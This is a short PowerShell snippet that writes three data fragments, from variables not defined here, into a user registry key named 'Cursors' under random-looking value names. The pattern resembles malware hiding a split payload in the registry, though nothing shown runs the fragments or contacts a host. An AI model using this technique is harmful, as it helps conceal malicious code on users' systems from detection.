$regPath = "HKCU:\Cursors"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
Set-ItemProperty -Path $regPath -Name "nLzTvI0bImeIeqyxHxTJ" -Value $frag1
Set-ItemProperty -Path $regPath -Name "pQzUwJ1cKnfLerzxGyUK" -Value $frag2
Set-ItemProperty -Path $regPath -Name "rMxVwL2dMogPfsayIzVL" -Value $frag3